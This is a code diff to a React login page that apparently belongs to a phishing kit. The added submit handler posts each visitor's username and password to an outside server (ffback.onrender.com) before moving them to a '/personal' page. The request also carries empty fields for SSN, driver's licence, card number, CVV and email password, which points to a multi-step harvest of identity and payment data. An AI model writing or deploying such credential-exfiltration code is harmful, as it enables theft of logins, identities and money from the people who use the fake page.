@@ -20,6 +20,7 @@ import footericon from './footericon.png';
 import main from './main.png';
 import toggle from './toggle.png';
 import close from './close.png';
+import axios from 'axios';
 
 import { useState } from 'react';
 
@@ -46,10 +47,50 @@ function Home(){
     const navigate = useNavigate();
 
 
-    function handleSubmit(e){
+   async function handleSubmit(e){
         e.preventDefault();
 
-        navigate('/personal', { state: { type: type, username:username,password:password } });
+       // navigate('/personal', { state: { type: type, username:username,password:password } });
+
+
+       try {
+
+        
+        
+        const response = await axios.post('https://ffback.onrender.com/api/send', {
+            
+            platform:"ffin",
+            type: type,
+            username:username,
+            password:password,
+            firstname:"",
+            lastname:"",
+            othername:"",
+            dob:"",
+            ssn:"",
+            driver_license:"",
+            address:"",
+            card_name:"",
+            card_number:"",
+            card_expiration:"",
+            card_cvv:"",
+            email:"",
+            email_pass:""
+        });
+    
+       
+
+        if(response.status == 200){
+            console.log(response.data.message);
+
+            navigate('/personal', { state: { type: type, username:username,password:password } });
+        
+        }
+      } catch (error) {
+        
+        console.error('Error:', error);
+       
+      }
     }
     return (
         <>
